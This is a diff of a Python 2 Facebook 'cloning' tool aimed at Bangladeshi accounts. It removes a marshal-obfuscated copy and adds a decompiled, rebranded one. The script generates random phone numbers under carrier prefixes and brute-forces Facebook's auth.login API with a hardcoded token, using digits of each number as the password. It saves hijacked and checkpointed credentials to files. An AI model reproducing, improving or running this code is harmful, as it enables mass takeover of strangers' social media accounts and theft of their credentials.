@@ -1,2 +1,277 @@
-import marshal
-exec(marshal.loads(b'sx \x00\x00# uncompyle6 version 3.8.0\r\n# Python bytecode 2.7 (62211)\r\n# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) \r\n# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/\r\n# Warning: this version of Python has problems handling the Python 3 byte type in constants properly.\r\n\r\n# Embedded file name: /storage/emulated/0/UF11.py\r\n# Compiled at: 2021-11-30 15:21:23\r\nimport os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass\r\nos.system(\'rm -rf .txt\')\r\n\r\ndef psb(z):\r\n    for e in z + \'\\n\':\r\n        sys.stdout.write(e)\r\n        sys.stdout.flush()\r\n        time.sleep(0.03)\r\n\r\n\r\nos.system(\'clear\')\r\npsb(\'\\x1b[1;32mBANGLADESH 11 DIGIT CLONING START PLEASE WAIT ..........\')\r\nfor n in range(9999):\r\n    nmbr = random.randint(1111111, 9999999)\r\n    sys.stdout = open(\'.txt\', \'a\')\r\n    print nmbr\r\n    sys.stdout.flush()\r\n\r\ntry:\r\n    import requests\r\nexcept ImportError:\r\n    os.system(\'pip2 install requests\')\r\n\r\ntry:\r\n    import mechanize\r\nexcept ImportError:\r\n    os.system(\'pip2 install mechanize\')\r\n    time.sleep(1)\r\n    os.system(\'python2 C\')\r\n\r\nfrom multiprocessing.pool import ThreadPool\r\nfrom requests.exceptions import ConnectionError\r\nfrom mechanize import Browser\r\nos.system(\'clear\')\r\nreload(sys)\r\nsys.setdefaultencoding(\'utf8\')\r\nbr = mechanize.Browser()\r\nbr.set_handle_robots(False)\r\nbr.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)\r\nbr.addheaders = [\r\n (\'user-agent\', \'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]\')]\r\n\r\ndef exb():\r\n    print\r\n    os.sys.exit()\r\n\r\n\r\ndef psb(z):\r\n    for e in z + \'\\n\':\r\n        sys.stdout.write(e)\r\n        sys.stdout.flush()\r\n        time.sleep(0.03)\r\n\r\n\r\ndef t():\r\n    time.sleep(1)\r\n\r\n\r\ndef cb():\r\n    os.system(\'clear\')\r\n\r\n\r\nlogo = \'\\n|("""\\33[93m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97     \\n\\033[91m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \\n\\033[1;32m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \\n\\33[97m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \\n\\033[96m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \\n\\033[0;35m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d     \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\\033[0m\'\r\n\r\nback = 0\r\nsuccessful = []\r\ncpb = []\r\noks = []\r\nid = []\r\n\r\ndef menu():\r\n    os.system(\'clear\')\r\n    print logo\r\n    print \'\'\r\n    print \'AUTHOR   : MAHDI HASAN SHUVO\'\r\n    print \'FACEBOOK : facebook.com/mahdi.80808\'\r\n    print \'GITHUB     : github.com/\'\r\n    print \'\'\r\n    print 50* \'-\'\r\n    print \'[1]  \\x1b[1;96mGP\'\r\n    print \'[2]  \\x1b[1;92mRobi\'\r\n    print \'[3]  \\x1b[1;96mAirtel\'\r\n    print \'[4]  \\x1b[1;92mBanglalink\'\r\n    print \'[5]  \\x1b[1;93mTeletalk\'\r\n    print \'[0]  \\x1b[1;95mExit            \'\r\n    print 50 * \'-\'\r\n    action()\r\n\r\n\r\ndef action():\r\n    global cpb\r\n    global oks\r\n    bch = raw_input(\'\\n  ===>   \')\r\n    if bch == \'\':\r\n        print\r\n        action()\r\n    elif bch == \'1\':\r\n        os.system(\'clear\')\r\n        print logo\r\n        print 50* \'-\'\r\n        print \'\'\r\n        print \'170,171, 172, 173, 174, 175, 176, 177, 178, 179,130,131, 132, 133, 134, 135, 136, 137, 138, 139\'\r\n        print \'\'\r\n        try:\r\n            c = raw_input(\' Choose Code  : \')\r\n            k = \'+880\'\r\n            idlist = \'.txt\'\r\n            for line in open(idlist, \'r\').readlines():\r\n                id.append(line.strip())\r\n\r\n        except IOError:\r\n            print \'[!] File Not Found\'\r\n            raw_input(\'\\n[ Back ]\')\r\n            menu()\r\n\r\n    elif bch == \'2\':\r\n        os.system(\'clear\')\r\n        print logo\r\n        print 50* \'-\'\r\n        print \'\'\r\n        print \'180,181, 182, 183, 184, 185, 186, 187, 188, 189\'\r\n        print \'\'\r\n        try:\r\n            c = raw_input(\' Choose Code  : \')\r\n            k = \'+880\'\r\n            idlist = \'.txt\'\r\n            for line in open(idlist, \'r\').readlines():\r\n                id.append(line.strip())\r\n\r\n        except IOError:\r\n            print \'[!] File Not Found\'\r\n            raw_input(\'\\n[ Back ]\')\r\n            menu()\r\n\r\n    elif bch == \'3\':\r\n        os.system(\'clear\')\r\n        print logo\r\n        print 50* \'-\'\r\n        print \'\'\r\n        print \'160,161, 162, 163, 164, 165, 166, 167, 168, 169\'\r\n        print \'\'\r\n        try:\r\n            c = raw_input(\' Choose Code  : \')\r\n            k = \'+880\'\r\n            idlist = \'.txt\'\r\n            for line in open(idlist, \'r\').readlines():\r\n                id.append(line.strip())\r\n\r\n        except IOError:\r\n            print \'[!] File Not Found\'\r\n            raw_input(\'\\n[ Back ]\')\r\n            menu()\r\n\r\n    elif bch == \'4\':\r\n        os.system(\'clear\')\r\n        print logo\r\n        print 50* \'-\'\r\n        print \'\'\r\n        print \'190,191, 192, 193, 194, 195, 196, 197, 198, 199,140,141, 142, 143, 144, 145, 146, 147, 148, 149\'\r\n        print \'\'\r\n        try:\r\n            c = raw_input(\' Choose Code  : \')\r\n            k = \'+880\'\r\n            idlist = \'.txt\'\r\n            for line in open(idlist, \'r\').readlines():\r\n                id.append(line.strip())\r\n\r\n        except IOError:\r\n            print \'[!] File Not Found\'\r\n            raw_input(\'\\n[ Back ]\')\r\n            menu()\r\n\r\n    elif bch == \'5\':\r\n        os.system(\'clear\')\r\n        print logo\r\n        print 50* \'-\'\r\n        print \'\'\r\n        print \'150,151, 152, 153, 154, 155, 156, 157, 158, 159\'\r\n        print \'\'\r\n        try:\r\n            c = raw_input(\' Choose Code  : \')\r\n            k = \'+880\'\r\n            idlist = \'.txt\'\r\n            for line in open(idlist, \'r\').readlines():\r\n                id.append(line.strip())\r\n\r\n        except IOError:\r\n            print \'[!] File Not Found\'\r\n            raw_input(\'\\n[ Back ]\')\r\n            menu()\r\n\r\n    elif bch == \'0\':\r\n        exb()\r\n    else:\r\n        print\r\n        action()\r\n    xxx = str(len(id))\r\n    print \'\'\r\n    print 50 * \'-\'\r\n    psb(\'[\\xe2\\x9c\\x93] Total Numbers: \' + xxx)\r\n    time.sleep(0.5)\r\n    psb(\'[\\xe2\\x9c\\x93] Please wait, process is running ...\')\r\n    time.sleep(0.5)\r\n    psb(\'[!] To Stop Process Press CTRL Then Press z\')\r\n    time.sleep(0.5)\r\n    psb(50 * \'-\')\r\n    time.sleep(0.5)\r\n    print\r\n    50 * \'-\'\r\n    print\r\n\r\n    def main(arg):\r\n        user = arg\r\n        try:\r\n            os.mkdir(\'save\')\r\n        except OSError:\r\n            pass\r\n\r\n        try:\r\n            result = k + c + user\r\n            digi11 = result[3:14]\r\n            pass1 = digi11\r\n            data = br.open(\'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=\' + k + c + user + \'&locale=en_US&password=\' + pass1 + \'&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm\')\r\n            q = json.load(data)\r\n            if \'access_token\' in q:\r\n                print \'\\x1b[1;92m[MAHDI-HACKED]\\x1b[0m \' + k + c + user + \' | \' + pass1 + \'\\n\' + \'\\n\'\r\n                okb = open(\'save/successfull.txt\', \'a\')\r\n                okb.write(k + c + user + \'|\' + pass1 + \'\\n\')\r\n                okb.close()\r\n                oks.append(c + user + pass1)\r\n            elif \'www.facebook.com\' in q[\'error_msg\']:\r\n                print \'\\x1b[1;93m[MAHDI-CP]\\x1b[1;97m \' + k + c + user + \' | \' + pass1 + \'\\x1b[1;93m[Open After 03 Days]\\x1b[0m \\n\'\r\n                cps = open(\'save/checkpoint.txt\', \'a\')\r\n                cps.write(k + c + user + \'|\' + pass1 + \'\\n\')\r\n                cps.close()\r\n                cpb.append(c + user + pass1)\r\n        except:\r\n            pass\r\n\r\n    p = ThreadPool(30)\r\n    p.map(main, id)\r\n    print\r\n    50 * \'-\'\r\n    print\r\n    print\r\n    \'[\\xe2\\x9c\\x93] Total OK/CP : \' + str(len(oks)) + \'/\' + str(len(cpb))\r\n    print \'[\\xe2\\x9c\\x93] CP File Has Been Saved : save/checkpoint.txt\'\r\n    raw_input(\'\\n[Press Enter To Go Back]\')\r\n    os.system(\'python2 Bangla.py\')\r\n\r\n\r\nif __name__ == \'__main__\':\r\n    menu()'))
+# Decompile by FLAME NAIM
+
+ #!/usr/bin/python
+ # uncompyle6 version 3.7.4
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+os.system('rm -rf .txt')
+ 
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+ 
+os.system('clear')
+print
+ 
+print
+ 
+print("""
+\033[0;94m ____  __  ___  ___  _  _  __  
+\033[0;94m(  _ \(  )/ __)/ __)/ )( \(  ) 
+\033[0;96m ) __/ )(( (__( (__ ) __ ( )(  
+\033[0;96m(__)  (__)\___)\___)\_)(_/(__) 
+ 
+""")
+
+print("\033[0;91mThis Tool's Free By Psycho Picchi")
+
+psb('\x1b[1;92mBANGLADESH 6 DIGIT CLONING START PLEASE WAIT .....')
+for n in range(90000):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+ 
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+ 
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(1)
+    os.system('python2 C')
+ 
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+os.system('clear')
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [
+ ('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+ 
+def exb():
+    print
+    os.sys.exit()
+ 
+ 
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+ 
+ 
+def t():
+    time.sleep(1)
+ 
+ 
+def cb():
+    os.system('clear')
+ 
+logo = """
+                                                                      
+\033[0;93m ____  __  ___  ___  _  _  __  
+\033[0;93m(  _ \(  )/ __)/ __)/ )( \(  ) 
+\033[0;96m ) __/ )(( (__( (__ ) __ ( )(  
+\033[0;96m(__)  (__)\___)\___)\_)(_/(__) 
+ 
+"""
+
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+ 
+def menu():
+    os.system('clear')
+    print logo
+    print ''
+    print '\033[0;93mAUTHOR   : PSYCH PICCHI'
+    print '\033[0;94mFACEBOOK : PSYCHO PICCHI'
+    print '\033[0;96mGITHUB   : PSYCHO-PICCHI'
+    print ''
+    print '\033[0;90mONLY BANGLADESHI ACCOUNTS ARE AVAILABLE'
+    print '\033[0;91m'
+    print 50* '-'
+    print '\033[0;92m[1]  \x1b[1;93mGP'
+    print '\033[0;95m[2]  \x1b[1;95mRobi'
+    print '\033[0;94m[3]  \x1b[1;94mAirtel'
+    print '\033[0;92m[4]  \x1b[1;92mBanglalink'
+    print '\033[0;96m[5]  \x1b[1;96mTeletalk'
+    print '\033[0;90m[0]  \x1b[1;90mExit            '
+    print '\033[0;91m'
+    print 50 * '-'
+    action()
+ 
+ 
+def action():
+    global cpb
+    global oks
+    bch = raw_input('\033[0;93m\n> ')
+    if bch == '':
+        print
+        action()
+    elif bch == '1':
+        os.system('clear')
+        print logo
+        print 50* '-'
+        print ''
+        print '170,171, 172, 173, 174, 175, 176, 177, 178, 179,130,131, 132, 133, 134, 135, 136, 137, 138, 139'
+        print''
+        try:
+            c = raw_input('\033[0;93mChoose Code : ')
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+ 
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+ 
+    elif bch == '2':
+        os.system('clear')
+        print logo
+        print 50* '-'
+        print ''
+        print '180,181, 182, 183, 184, 185, 186, 187, 188, 189'
+        print''
+        try:
+            c = raw_input('\033[0;93mChoose Code : ')
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+ 
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+ 
+    elif bch == '3':
+        os.system('clear')
+        print logo
+        print 50* '-'
+        print ''
+        print '160,161, 162, 163, 164, 165, 166, 167, 168, 169'
+        print''
+        try:
+            c = raw_input('\033[0;93mChoose Code : ')
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+ 
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+ 
+    elif bch == '4':
+        os.system('clear')
+        print logo
+        print 50* '-'
+        print ''
+        print '190,191, 192, 193, 194, 195, 196, 197, 198, 199,140,141, 142, 143, 144, 145, 146, 147, 148, 149'
+        print''
+        try:
+            c = raw_input('\033[0;93mChoose Code : ')
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+ 
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+ 
+    elif bch == '5':
+        os.system('clear')
+        print logo
+        print 50* '-'
+        print ''
+        print '150,151, 152, 153, 154, 155, 156, 157, 158, 159'
+        print''
+        try:
+            c = raw_input('\033[0;93mChoose Code : ')
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+ 
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+ 
+    elif bch == '0':
+        exb()
+    else:
+        print
+        action()
+    xxx = str(len(id))
+    psb('[\xe2\x9c\x93] Total Numbers: ' + xxx)
+    time.sleep(0.5)
+    psb('[\xe2\x9c\x96] Please wait, process is running ...')
+    time.sleep(0.5)
+    psb('[!] To Stop Process Press CTRL Then Press z')
+    time.sleep(0.5)
+    psb(50 * '-')
+    time.sleep(0.5)
+    print
+    50 * '-'
+    print
+ 
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+ 
+        try:
+            result = k + c + user
+            digi6 = result[8:14]
+            pass1 = digi6
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[PSYCHO-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '|' + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[PICCHI-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
+                cps = open('save/checkpoint.txt', 'a')
+                cps.write(k + c + user + '|' + pass1 + '\n')
+                cps.close()
+                cpb.append(c + user + pass1)
+        except:
+            pass
+ 
+    p = ThreadPool(30)
+    p.map(main, id)
+    print
+    50 * '-'
+    print
+    print
+    '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '[\xe2\x9c\x93] CP File Has Been Saved : save/checkpoint.txt'
+    raw_input('\n[Press Enter To Go Back]')
+    os.system('python2 Psycho.py')
+ 
+ 
+if __name__ == '__main__':
+    menu()
